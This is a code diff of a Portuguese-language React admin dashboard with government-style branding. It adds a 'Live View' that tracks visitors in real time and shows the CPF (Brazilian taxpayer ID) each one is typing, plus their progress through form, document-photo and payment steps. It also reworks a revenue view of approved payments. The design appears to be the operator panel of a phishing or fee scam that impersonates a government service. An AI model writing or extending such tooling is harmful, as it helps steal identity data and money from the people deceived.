@@ -1,7 +1,7 @@
 "use client";
 
 import { GovHeader } from "@/components/GovHeader";
-import { Search, Filter, Download, Eye, MoreHorizontal, CheckCircle2, Clock, XCircle, RotateCcw, Home, Users, CreditCard, Settings, PlusCircle, LogOut } from "lucide-react";
+import { Search, Filter, Download, Eye, MoreHorizontal, CheckCircle2, Clock, XCircle, RotateCcw, Home, Users, CreditCard, Settings, PlusCircle, LogOut, Globe } from "lucide-react";
 import { useState, useEffect } from "react";
 import { Solicitation } from "@/lib/db";
 
@@ -11,17 +11,19 @@ export default function AdminPage() {
     const [selectedSolicitacao, setSelectedSolicitacao] = useState<Solicitation | null>(null);
     const [onlineUsers, setOnlineUsers] = useState(0);
     const [analytics, setAnalytics] = useState<{ step: string, count: number }[]>([]);
-    const [currentView, setCurrentView] = useState<'dashboard' | 'solicitations' | 'finance'>('dashboard');
+    const [activeSessions, setActiveSessions] = useState<any[]>([]);
+    const [currentView, setCurrentView] = useState<'dashboard' | 'solicitations' | 'finance' | 'live-view'>('dashboard');
 
     const fetchData = async () => {
         try {
             const res = await fetch('/api/solicitations');
             const data = await res.json();
 
-            if (data.solicitations && Array.isArray(data.solicitations)) {
+            if (data.solicitations) {
                 setSolicitacoes(data.solicitations.reverse());
                 setOnlineUsers(data.onlineUsers || 0);
                 setAnalytics(data.analytics || []);
+                setActiveSessions(data.activeSessions || []);
             } else if (Array.isArray(data)) {
                 // Fallback for old API response structure if not yet updated
                 setSolicitacoes(data.reverse());
@@ -141,6 +143,9 @@ export default function AdminPage() {
                     <div className="px-4 py-2 text-xs font-bold text-slate-500 uppercase tracking-wider">Principal</div>
                     <button onClick={() => setCurrentView('dashboard')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl shadow-md transition-all font-medium ${currentView === 'dashboard' ? 'bg-gov-blue-600 text-white' : 'hover:bg-slate-800 text-slate-400 hover:text-white'}`}>
                         <Home className="h-5 w-5" /> Dashboard
+                    </button>
+                    <button onClick={() => setCurrentView('live-view')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl shadow-md transition-all font-medium ${currentView === 'live-view' ? 'bg-gov-blue-600 text-white' : 'hover:bg-slate-800 text-slate-400 hover:text-white'}`}>
+                        <Globe className="h-5 w-5 animate-pulse text-green-400" /> Live View <span className="ml-auto bg-green-500 text-white text-[10px] px-1.5 py-0.5 rounded-full">{onlineUsers}</span>
                     </button>
                     <button onClick={() => setCurrentView('solicitations')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl shadow-md transition-all font-medium ${currentView === 'solicitations' ? 'bg-gov-blue-600 text-white' : 'hover:bg-slate-800 text-slate-400 hover:text-white'}`}>
                         <Users className="h-5 w-5" /> Solicitações
@@ -338,9 +343,121 @@ export default function AdminPage() {
                     </div>
                 )}
 
-                {/* Table */}
-                {/* Content switching based on view */}
-                {currentView !== 'finance' ? (
+                {/* VIEW SWITCHER */}
+                {currentView === 'live-view' ? (
+                    <div className="space-y-6 animate-in fade-in slide-in-from-right-4">
+                        <div className="bg-slate-900 rounded-2xl p-8 text-white shadow-xl relative overflow-hidden flex items-center justify-between">
+                            <div className="relative z-10">
+                                <h2 className="text-3xl font-extrabold mb-1 flex items-center gap-3">
+                                    Live View <span className="bg-green-500 text-xs px-2 py-1 rounded-full animate-pulse">AO VIVO</span>
+                                </h2>
+                                <p className="text-slate-400">Monitoramento de tráfego em tempo real.</p>
+                            </div>
+                            <div className="text-right">
+                                <p className="text-5xl font-mono font-bold text-green-400">{activeSessions.length}</p>
+                                <p className="text-xs text-slate-500 uppercase tracking-widest">Sessões Ativas</p>
+                            </div>
+                        </div>
+
+                        <div className="bg-white rounded-xl border border-slate-200 shadow-sm overflow-hidden">
+                            <table className="w-full text-left">
+                                <thead className="bg-slate-50 border-b border-slate-200">
+                                    <tr>
+                                        <th className="p-4 w-1"></th>
+                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase">Visitante ID</th>
+                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase">Localização Atual</th>
+                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase">Atividade</th>
+                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase text-right">Visto por último</th>
+                                    </tr>
+                                </thead>
+                                <tbody className="divide-y divide-slate-100">
+                                    {activeSessions.length === 0 ? (
+                                        <tr><td colSpan={5} className="p-8 text-center text-slate-500">Nenhum usuário ativo no momento.</td></tr>
+                                    ) : (
+                                        activeSessions.map((session, idx) => {
+                                            const timeAgo = Math.floor((new Date().getTime() - new Date(session.last_seen).getTime()) / 1000 / 60);
+                                            return (
+                                                <tr key={session.id || idx} className="hover:bg-slate-50 transition-colors">
+                                                    <td className="p-4">
+                                                        <div className="h-2.5 w-2.5 rounded-full bg-green-500 animate-pulse shadow-[0_0_8px_rgba(34,197,94,0.6)]"></div>
+                                                    </td>
+                                                    <td className="p-4 font-mono text-xs text-slate-500">
+                                                        {session.id?.includes('.') ? session.id.split('.').slice(0, 2).join('.') + '.***' : 'Session-' + idx}
+                                                    </td>
+                                                    <td className="p-4">
+                                                        <span className={`px-2 py-1 rounded text-xs font-bold border ${session.current_step === 'payment_page_view' ? 'bg-green-50 border-green-200 text-green-700' :
+                                                            session.current_step === 'form_submitted' ? 'bg-orange-50 border-orange-200 text-orange-700' :
+                                                                session.current_step === 'active' ? 'bg-blue-50 border-blue-200 text-blue-700' :
+                                                                    'bg-slate-100 border-slate-200 text-slate-600'
+                                                            }`}>
+                                                            {session.current_step === 'home_view' ? 'Landing Page' :
+                                                                session.current_step === 'personal_data_form' ? 'Preenchendo Dados' :
+                                                                    session.current_step === 'taking_photo' ? 'Enviando Documentos' :
+                                                                        session.current_step === 'form_submitted' ? 'Aguardando Aprovação' :
+                                                                            session.current_step === 'payment_page_view' ? 'Pagamento' :
+                                                                                session.current_step}
+                                                        </span>
+                                                    </td>
+                                                    <td className="p-4 text-xs text-slate-600">
+                                                        {session.metadata?.cpf ? `Digitando CPF: ${session.metadata.cpf}...` :
+                                                            session.metadata?.action ? `Ação: ${session.metadata.action}` : 'Navegando...'}
+                                                    </td>
+                                                    <td className="p-4 text-right text-xs font-bold text-slate-500">
+                                                        {timeAgo < 1 ? 'Agora mesmo' : `há ${timeAgo} min`}
+                                                    </td>
+                                                </tr>
+                                            );
+                                        })
+                                    )}
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                ) : currentView === 'finance' ? (
+                    /* FINANCE VIEW */
+                    <div className="space-y-6 animate-in fade-in slide-in-from-right-4">
+                        <div className="bg-gradient-to-br from-slate-900 to-slate-800 rounded-2xl p-8 text-white shadow-xl relative overflow-hidden">
+                            <div className="relative z-10">
+                                <p className="text-slate-400 font-bold uppercase tracking-wider text-sm mb-2">Faturamento Total</p>
+                                <h2 className="text-5xl font-extrabold mb-4">{totalReceita}</h2>
+                                <p className="text-green-400 font-bold flex items-center gap-2">
+                                    <CheckCircle2 className="h-5 w-5" />
+                                    {totalAprovados} Pagamentos Confirmados
+                                </p>
+                            </div>
+                            <CreditCard className="absolute right-0 bottom-0 h-64 w-64 text-white opacity-5 -mr-10 -mb-10" />
+                        </div>
+
+                        <h3 className="font-bold text-slate-800 text-xl">Transações Recentes</h3>
+                        <div className="bg-white rounded-xl border border-slate-200 shadow-sm overflow-hidden">
+                            <table className="w-full text-left">
+                                <thead className="bg-slate-50 border-b border-slate-200">
+                                    <tr>
+                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase">Data</th>
+                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase">Cliente</th>
+                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase">Transaction ID</th>
+                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase text-right">Valor</th>
+                                    </tr>
+                                </thead>
+                                <tbody className="divide-y divide-slate-100">
+                                    {solicitacoes.filter(s => s.status === 'aprovado').length === 0 ? (
+                                        <tr><td colSpan={4} className="p-8 text-center text-slate-500">Nenhuma transação aprovada ainda.</td></tr>
+                                    ) : (
+                                        solicitacoes.filter(s => s.status === 'aprovado').map(sol => (
+                                            <tr key={sol.cpf}>
+                                                <td className="p-4 text-sm text-slate-600">{sol.created_at}</td>
+                                                <td className="p-4 font-bold text-slate-800">{sol.nome}</td>
+                                                <td className="p-4 text-xs font-mono text-slate-400">{sol.transaction_id || '---'}</td>
+                                                <td className="p-4 text-right font-bold text-green-700 opacity-100">{sol.valor}</td>
+                                            </tr>
+                                        ))
+                                    )}
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                ) : (
+                    /* DEFAULT TABLE (Dashboard & Solicitations) */
                     <div className="bg-white rounded-xl border border-slate-200 shadow-sm overflow-hidden animate-in fade-in slide-in-from-bottom-4">
                         <table className="w-full text-left border-collapse">
                             <thead>
@@ -401,49 +518,6 @@ export default function AdminPage() {
                                 )}
                             </tbody>
                         </table>
-                    </div>
-                ) : (
-                    /* FINANCE VIEW */
-                    <div className="space-y-6 animate-in fade-in slide-in-from-right-4">
-                        <div className="bg-gradient-to-br from-slate-900 to-slate-800 rounded-2xl p-8 text-white shadow-xl relative overflow-hidden">
-                            <div className="relative z-10">
-                                <p className="text-slate-400 font-bold uppercase tracking-wider text-sm mb-2">Faturamento Total</p>
-                                <h2 className="text-5xl font-extrabold mb-4">{totalReceita}</h2>
-                                <p className="text-green-400 font-bold flex items-center gap-2">
-                                    <CheckCircle2 className="h-5 w-5" />
-                                    {totalAprovados} Pagamentos Confirmados
-                                </p>
-                            </div>
-                            <CreditCard className="absolute right-0 bottom-0 h-64 w-64 text-white opacity-5 -mr-10 -mb-10" />
-                        </div>
-
-                        <h3 className="font-bold text-slate-800 text-xl">Transações Recentes</h3>
-                        <div className="bg-white rounded-xl border border-slate-200 shadow-sm overflow-hidden">
-                            <table className="w-full text-left">
-                                <thead className="bg-slate-50 border-b border-slate-200">
-                                    <tr>
-                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase">Data</th>
-                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase">Cliente</th>
-                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase">Transaction ID</th>
-                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase text-right">Valor</th>
-                                    </tr>
-                                </thead>
-                                <tbody className="divide-y divide-slate-100">
-                                    {solicitacoes.filter(s => s.status === 'aprovado').length === 0 ? (
-                                        <tr><td colSpan={4} className="p-8 text-center text-slate-500">Nenhuma transação aprovada ainda.</td></tr>
-                                    ) : (
-                                        solicitacoes.filter(s => s.status === 'aprovado').map(sol => (
-                                            <tr key={sol.cpf}>
-                                                <td className="p-4 text-sm text-slate-600">{sol.created_at}</td>
-                                                <td className="p-4 font-bold text-slate-800">{sol.nome}</td>
-                                                <td className="p-4 text-xs font-mono text-slate-400">{sol.transaction_id || '---'}</td>
-                                                <td className="p-4 text-right font-bold text-green-700 opacity-100">{sol.valor}</td>
-                                            </tr>
-                                        ))
-                                    )}
-                                </tbody>
-                            </table>
-                        </div>
                     </div>
                 )}
 
